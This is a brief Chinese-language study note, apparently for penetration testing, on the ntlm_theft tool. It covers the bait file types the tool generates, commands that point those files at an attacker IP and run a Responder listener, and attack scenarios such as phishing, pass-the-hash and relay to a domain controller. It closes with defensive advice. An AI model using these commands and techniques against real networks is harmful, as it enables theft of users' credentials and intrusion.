# ntlm_theft

## 介绍

ntlm_theft是Github上一款开源的python工具,能用来生成21种不同类型的NTLM哈希盗取文件(如.docx\\.rtf\\.url\\.htm\\.xml等),专门用来钓鱼NTLM,节省配置时间.

https://github.com/Greenwolf/ntlm_theft

### 生成文件类型示例

.url/.lnk(游览文件夹触发)

.docx(远程模板/帧集/包含突破)

.rtf/.htm/.xml(打开触发)

modern模式:只生成现代windows的(WIN10+)有效的文件(跳过SCF等漏洞)

## 使用命令示例

python3 ntlm_theft.py -g all -s attackIp -f file #生成所有类型

python3 ntlm_theft.py -g modern -s attackIp -f file #生成现在类型

配合监听工具

responder -I eht0 -v

## 应用场景

1)内部网络:上传恶意文件至文件夹/WebDAV/通过钓鱼邮件发送

2)横向移动:窃取域用户哈希->破解->PTH到其他机器或relay到域控

3)常见结合:与responder/impacket ntlmrelayx/mssql xp_dirtree/WebDAV等

4)注意事项:

​	(1)现代Windows补丁后SCF/@search等无效,用modern模式

​	(2)AV/EDR可能检测,OSCP通常无AV

​	(3)文件生成/Responder捕捉哈希/破解成功

## 防御建议

(1)禁用NTLM(优先 Kerberos)

(2)启动SMB签名/EPA(Extended Protection for Authentication)

(3)限制出站SMB(组策略阻止到外部IP)

(4)监控NTLM认证事件日志